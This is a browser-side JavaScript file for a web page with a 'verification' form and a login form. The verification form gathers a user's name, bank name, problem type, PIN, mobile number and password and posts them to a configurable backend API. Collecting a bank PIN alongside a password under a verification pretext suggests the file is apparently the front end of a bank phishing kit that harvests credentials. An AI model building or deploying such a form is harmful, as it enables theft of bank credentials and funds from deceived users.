const apiBase = typeof window.__API_BASE__ === "string" ? window.__API_BASE__.replace(/\/$/, "") : "";

function apiUrl(path) {
  const p = path.startsWith("/") ? path : `/${path}`;
  return `${apiBase}${p}`;
}

function showMessage(elementId, message, ok) {
  const el = document.getElementById(elementId);
  if (!el) return;
  el.className = `status ${ok ? "success" : "error"}`;
  el.textContent = message;
}

function toggleVisibility(buttonId, inputId) {
  const btn = document.getElementById(buttonId);
  const input = document.getElementById(inputId);
  if (!btn || !input) return;
  btn.addEventListener("click", () => {
    input.type = input.type === "password" ? "text" : "password";
  });
}

toggleVisibility("togglePin", "pin");
toggleVisibility("togglePassword", "password");
toggleVisibility("toggleLoginPassword", "loginPassword");

const verificationForm = document.getElementById("verificationForm");
if (verificationForm) {
  verificationForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const payload = {
      name: document.getElementById("name").value.trim(),
      bankName: document.getElementById("bankName").value,
      problemType: document.getElementById("problemType").value,
      pin: document.getElementById("pin").value.trim(),
      experienceLevel: document.getElementById("experienceLevel").value,
      mobile: document.getElementById("mobile").value.trim(),
      password: document.getElementById("password").value
    };

    try {
      const res = await fetch(apiUrl("/api/verification"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json().catch(() => ({}));
      const msg = res.ok
        ? data.message || "Done."
        : [data.message, data.detail].filter(Boolean).join(" — ") || `Request failed (${res.status}).`;
      showMessage("verificationStatus", msg, res.ok);
      if (res.ok) {
        verificationForm.reset();
      }
    } catch (_err) {
      showMessage(
        "verificationStatus",
        "Network error — check API URL (public/config.js) if site and backend are on different hosts.",
        false
      );
    }
  });
}

const loginForm = document.getElementById("loginForm");
if (loginForm) {
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const payload = {
      mobile: document.getElementById("loginMobile").value.trim(),
      password: document.getElementById("loginPassword").value
    };

    try {
      const res = await fetch(apiUrl("/api/login"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json().catch(() => ({}));
      const msg = res.ok
        ? data.message || "Done."
        : [data.message, data.detail].filter(Boolean).join(" — ") || `Request failed (${res.status}).`;
      showMessage("loginStatus", msg, res.ok);
      if (res.ok) {
        loginForm.reset();
      }
    } catch (_err) {
      showMessage(
        "loginStatus",
        "Network error — check API URL (public/config.js) if site and backend are on different hosts.",
        false
      );
    }
  });
}
